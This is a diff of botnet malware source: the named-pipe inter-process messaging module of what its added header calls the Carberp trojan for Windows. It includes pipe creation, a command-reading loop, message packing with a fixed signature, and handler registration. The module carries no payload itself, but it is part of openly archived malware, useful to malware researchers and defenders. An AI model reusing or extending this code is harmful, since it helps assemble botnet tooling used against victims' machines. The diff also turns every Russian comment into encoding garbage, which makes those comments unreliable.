@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 
@@ -10,32 +21,32 @@
 //---------------------------------------------------------------------------
 
 
-// Путь к директории каналов
+// пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 char PipesPath[] = {'\\', '\\', '.', '\\', 'p', 'i', 'p', 'e', '\\',  0};;
 
-// Префикс каналов бота
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 char BotPipePrefix[] = {'b', 't', 'p', 'i', 'p', 'e', 's',  0};
 
 
 //********************************************************************
-//  Внутренние методы для работы с каналами
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //********************************************************************
 
 namespace PIPE
 {
-	// Размер буфера приёма данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	#define IN_BUF_SIZE 4096
 
-	// Размер буфера отправки данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	#define OUT_BUF_SIZE 4096
 
-	// Парметры канала
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	#define PIPE_PARAMS PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT
 
-	// Сигнатура сообщения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	#define MESSAGE_SIGNATURE 0xDD047556
 
-	// Версия сообщения
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	#define MESSAGE_VERSION 0x00000001
 
 
@@ -44,7 +55,7 @@ namespace PIPE
 
     char CommandPing[] = {'p','i','n','g', 0};
 
-	// Структура хранения информации о зарегистрированном обработчике
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	typedef struct THandlerRec
 	{
     	LPVOID Data;
@@ -55,25 +66,25 @@ namespace PIPE
 	} *PHandlerRec;
 	//------------------------------------------------------------------------
 
-	// Функция возвращает полное имя канала
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR GetFullName(PCHAR Name);
 
-	// Функция потока ожидания данных в канале
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD WINAPI PipeThreadProc(LPVOID Data);
 
-	// Функция формирует сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     LPBYTE FormatMessage(PCHAR Message, DWORD Size);
 
-	// Обработать сообщение пришедшее по каналу
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	void ProcessMessage(PProcessPipe Pipe, PCHAR Msg, DWORD MsgSize, PCHAR Answer, int& AnswerSize );
 
-    // Функция запаковывает сообщение
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	LPBYTE PackMessage(LPBYTE OutBuf, DWORD BufSize, PCHAR PipeMessage, PCHAR Data, DWORD DataSize, DWORD PID, PCHAR ProcessName, DWORD &OutSize);
 
-	// Функция распаковывает сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool UnPackMessage(PCHAR Buf, DWORD BufSize, PPipeMessage Message);
 
-	// Функция копирует сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	void CopyMessage(PPipeMessage Source, PPipeMessage Destination);
 }
 
@@ -82,7 +93,7 @@ namespace PIPE
 
 PCHAR PIPE::GetFullName(PCHAR Name)
 {
-	// Функция возвращает полное имя канала
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(Name))
 		return NULL;
 	return STR::New(3, PipesPath, BotPipePrefix, Name);
@@ -91,15 +102,15 @@ PCHAR PIPE::GetFullName(PCHAR Name)
 
 DWORD WINAPI PIPE::PipeThreadProc(LPVOID Data)
 {
-	// Функция потока ожидания данных в канале
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PProcessPipe Chanal = (PProcessPipe)Data;
 
-	// Создаём канал
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	Chanal->Handle = Create(Chanal->Name);
 
 	bool Invalid = Chanal->Handle == NULL;
 
-	// Уведомляем метод, создатель, об окончании инициализации
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     pSetEvent(Chanal->Event);
 
 	if (Invalid) return 0;
@@ -107,31 +118,31 @@ DWORD WINAPI PIPE::PipeThreadProc(LPVOID Data)
 	PCHAR Buf = STR::Alloc(IN_BUF_SIZE + 1);
 	PCHAR Answer = STR::Alloc(IN_BUF_SIZE + 1);
 
-	// Запускаем цикл ожидания клиентов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
  	while(!Chanal->Terminated)
 	{
-		// Ожидаем подключения клиента
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		BOOL Connected = (BOOL)pConnectNamedPipe(Chanal->Handle, NULL);
 
-		/* TODO : Сделать обработку ошибки подключения клиента канала */
+		/* TODO : пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ */
 		if (!Connected)
 		{
 			return 0;
 		}
 
-		// Запускаем цикл чтения комманд
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		while (!Chanal->Terminated)
 		{
 			m_memset(Buf, 0, IN_BUF_SIZE + 1);
 			DWORD Readed = 0;
-			// Ожидаем поступления данных в файл
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 			if (pReadFile(Chanal->Handle, Buf, IN_BUF_SIZE, &Readed, NULL))
 			{
-				// Обрабатываем сообщение
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				int AnswerSize;
 				ProcessMessage(Chanal, Buf, Readed, Answer, AnswerSize);
 
-				// Уведомляем клиента о прочитанном сообщении
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				DWORD OutMsgSize = 0;
 
 				PackMessage((LPBYTE)Buf, IN_BUF_SIZE, OkResponse, Answer, AnswerSize, 0, NULL, OutMsgSize);
@@ -160,14 +171,14 @@ DWORD WINAPI PIPE::PipeThreadProc(LPVOID Data)
 
 void PIPE::ProcessMessage(PProcessPipe Pipe, PCHAR Msg, DWORD MsgSize, PCHAR Answer, int& AnswerSize )
 {
-	// Обработать сообщение пришедшее по каналу
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(Msg) || MsgSize == 0)
 		return;
-	// Разбираем сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TPipeMessage Message;
 	if (!UnPackMessage(Msg, MsgSize, &Message))
 		return;
-	// Вызываем обработчики сообщений
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pEnterCriticalSection(&Pipe->Lock);
 
     bool Cancel = false;
@@ -178,14 +189,14 @@ void PIPE::ProcessMessage(PProcessPipe Pipe, PCHAR Msg, DWORD MsgSize, PCHAR Ans
 
 		if (!STR::IsEmpty(Rec->Message))
 		{
-			// Проверяем текст сообщения
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if (!StrSame(Rec->Message, Message.Message, true, 0))
 				continue;
 		}
 		else
 		if (Rec->MessageHash != 0)
 		{
-			// Проверяем хэш сообщения
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if (Rec->MessageHash != Message.MessageHash)
             	continue;
 		}
@@ -211,7 +222,7 @@ LPBYTE PIPE::PackMessage(LPBYTE OutBuf, DWORD BufSize, PCHAR PipeMessage, PCHAR 
 	if (PID == 0)
 		PID = GetUniquePID();
 
-	// Функция формирует сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	LPBYTE Message = OutBuf;
 	if (BufSize == 0)
 		BufSize = OUT_BUF_SIZE;
@@ -228,31 +239,31 @@ LPBYTE PIPE::PackMessage(LPBYTE OutBuf, DWORD BufSize, PCHAR PipeMessage, PCHAR 
 
 	#define AddDWORD(V) *(PDWORD)Buf = V; Buf += sizeof(DWORD)
 
-	AddDWORD(MESSAGE_SIGNATURE); // Записываем сигнатуру
-	AddDWORD(MESSAGE_VERSION);   // Записываем версию
-	AddDWORD(PID);               // Записываем PID
+	AddDWORD(MESSAGE_SIGNATURE); // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	AddDWORD(MESSAGE_VERSION);   // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	AddDWORD(PID);               // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PID
 
-	// Записываем размер имени процесса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD  PNS = StrCalcLength(ProcessName);
 	AddDWORD(PNS);
 
-	// Записываем имя процесса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	m_memcpy(Buf, ProcessName, PNS);
 	Buf += PNS;
 
-	// Записываем имя сообщения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     DWORD MsgSize = StrCalcLength(PipeMessage);
 	AddDWORD(MsgSize);
-	m_memcpy(Buf, PipeMessage, MsgSize + 1); // Добавляем нулевой символ
+	m_memcpy(Buf, PipeMessage, MsgSize + 1); // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
     Buf += MsgSize + 1;
 
-	// Записываем данные сообщения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     AddDWORD(DataSize);
 	m_memcpy(Buf, Data, DataSize);
 	Buf += DataSize;
 
 	OutSize = Buf - Message;
-	OutSize++; // Завершающий ноль
+	OutSize++; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 	return Message;
 }
@@ -260,7 +271,7 @@ LPBYTE PIPE::PackMessage(LPBYTE OutBuf, DWORD BufSize, PCHAR PipeMessage, PCHAR 
 
 bool PIPE::UnPackMessage(PCHAR Buf, DWORD BufSize, PPipeMessage Message)
 {
-	// Функция распаковывает сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Buf == NULL || BufSize == 0)
 		return false;
 
@@ -270,21 +281,21 @@ bool PIPE::UnPackMessage(PCHAR Buf, DWORD BufSize, PPipeMessage Message)
 
 	ClearStruct(*Message);
 
-	// Проверяем заголовок сообщения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Signature = GetDWORD();
 	DWORD Version   = GetDWORD();
 
 	if (Signature != MESSAGE_SIGNATURE || Version != MESSAGE_VERSION)
 		return false;
 
-	// получаем информацию о процессе, отправителе
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Message->PID = GetDWORD();
 
 	DWORD PNS = GetDWORD();
 	Message->ProcessName = Tmp;
 	Tmp += PNS;
 
-	// Определяем сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Message->MsgSize     = GetDWORD();
 	Message->Message     = Tmp;
     Tmp += Message->MsgSize + 1;
@@ -298,7 +309,7 @@ bool PIPE::UnPackMessage(PCHAR Buf, DWORD BufSize, PPipeMessage Message)
 
 void PIPE::CopyMessage(PPipeMessage Source, PPipeMessage Destination)
 {
-	// Функция копирует сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Source == NULL || Destination == NULL)
 		return;
 
@@ -310,14 +321,14 @@ void PIPE::CopyMessage(PPipeMessage Source, PPipeMessage Destination)
 
 HANDLE PIPE::Create(PCHAR Name)
 {
-	// Функция создаёт объект именованного канала
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// Получаем имя канала
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR PipeName = GetFullName(Name);
 	if (PipeName == NULL)
 		return NULL;
 
-	// Создаём канал
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	HANDLE Handle = (HANDLE)pCreateNamedPipeA(
 								PipeName,
 								PIPE_ACCESS_DUPLEX,
@@ -329,7 +340,7 @@ HANDLE PIPE::Create(PCHAR Name)
 	if (Handle == INVALID_HANDLE_VALUE)
     	Handle = NULL;
 
-	// Освобождаем временные ресурсы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	STR::Free(PipeName);
 
 	return Handle;
@@ -338,17 +349,17 @@ HANDLE PIPE::Create(PCHAR Name)
 
 PProcessPipe PIPE::CreateProcessPipe(const PCHAR PipeName, bool StartPipe)
 {
-	// Функция создаёт глобальный канал процесса и запускает процесс
-	// ожидания сообщений
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(PipeName))
 		return NULL;
 
-	// Создаём структуру канала
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PProcessPipe Pipe = CreateStruct(TProcessPipe);
 	if (Pipe == NULL)
 		return NULL;
 
-    // Инициализируем данные
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	Pipe->Name = STR::New(PipeName);
 	Pipe->Handlers = List::Create();
 	pInitializeCriticalSection(&Pipe->Lock);
@@ -357,11 +368,11 @@ PProcessPipe PIPE::CreateProcessPipe(const PCHAR PipeName, bool StartPipe)
 	if (!StartPipe)
 		return Pipe;
 
-    // Запускаем канал
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	if (!StartProcessPipe(Pipe))
 	{
-    	// Произошла ошибка инициализации канала
+    	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		List::Free(Pipe->Handle);
 		STR::Free(Pipe->Name);
 		FreeStruct(Pipe);
@@ -374,7 +385,7 @@ PProcessPipe PIPE::CreateProcessPipe(const PCHAR PipeName, bool StartPipe)
 
 bool PIPE::StartProcessPipe(PProcessPipe Pipe)
 {
-	//  Функция стартует работу канада
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Pipe == NULL)
 		return false;
 
@@ -383,11 +394,11 @@ bool PIPE::StartProcessPipe(PProcessPipe Pipe)
 
 	Pipe->Event = (HANDLE)pCreateEventA(NULL, TRUE, FALSE, NULL);
 
-	// Запускаем поток
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	StartThread(PipeThreadProc, Pipe);
 
 
-	// Ожидаем ответа потока об окончании инициализации
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pWaitForSingleObject(Pipe->Event, INFINITE);
 
 	pCloseHandle(Pipe->Event);
@@ -397,7 +408,7 @@ bool PIPE::StartProcessPipe(PProcessPipe Pipe)
 
 void PIPE::FreeProcessPipe(PProcessPipe Pipe)
 {
-	//  FreeProcessPipe функция уничтожает пайп процесса
+	//  FreeProcessPipe пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Pipe == NULL)
 		return;
 
@@ -414,11 +425,11 @@ void PIPE::FreeProcessPipe(PProcessPipe Pipe)
 
 bool PIPE::SendMessage(PCHAR PipeName, PCHAR Msg, PCHAR Data, DWORD DataSize, void* Answer)
 {
-	// Функция отправляет указанному каналу сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Msg == NULL || STR::IsEmpty(PipeName))
 		return false;
 
-	// Получаем полное имя канала
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Name = GetFullName(PipeName);
 	if (Name == NULL)
 		return false;
@@ -429,21 +440,21 @@ bool PIPE::SendMessage(PCHAR PipeName, PCHAR Msg, PCHAR Data, DWORD DataSize, vo
 	bool Result = false;
 	for(;;)
 	{
-		// Открываем файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		HANDLE Pipe = (HANDLE)pCreateFileA(Name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 		if (Pipe != INVALID_HANDLE_VALUE)
 		{
-    		// Формируем сообщение
+    		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			DWORD OutSize = 0;
 			LPBYTE OutMessage = PackMessage(NULL, 0, Msg, Data, DataSize, 0, NULL, OutSize);
-			// Записываем данные
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			if (OutMessage != NULL)
 			{
 				DWORD Writed = 0;
 				pWriteFile(Pipe, OutMessage, OutSize, &Writed, NULL);
 				MemFree(OutMessage);
 
-				// Ожидаем ответ сервера
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				if (Writed == OutSize)
 				{
 					PCHAR InBuf = STR::Alloc(IN_BUF_SIZE);
@@ -464,7 +475,7 @@ bool PIPE::SendMessage(PCHAR PipeName, PCHAR Msg, PCHAR Data, DWORD DataSize, vo
 				}
 			}
 
-			// Закрываем файл
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		    pCloseHandle(Pipe);
 			break;
 		}
@@ -490,7 +501,7 @@ bool PIPE::SendMessage(PCHAR PipeName, PCHAR Msg)
 
 DWORD PIPE::Ping(PCHAR PipeName)
 {
-	//  Функция процеряет существование канала PipeName
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ PipeName
 	if (STR::IsEmpty(PipeName))
 		return false;
 
@@ -502,7 +513,7 @@ DWORD PIPE::Ping(PCHAR PipeName)
 bool PIPE::RegisterMessageHandler(PProcessPipe Pipe, TPipeMessageHandler Handler,
 							LPVOID Data, PCHAR Message, DWORD MessageHash)
 {
-	// Функция регистрирует обработчик сообщения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Pipe == NULL || Handler == NULL)
 		return false;
 
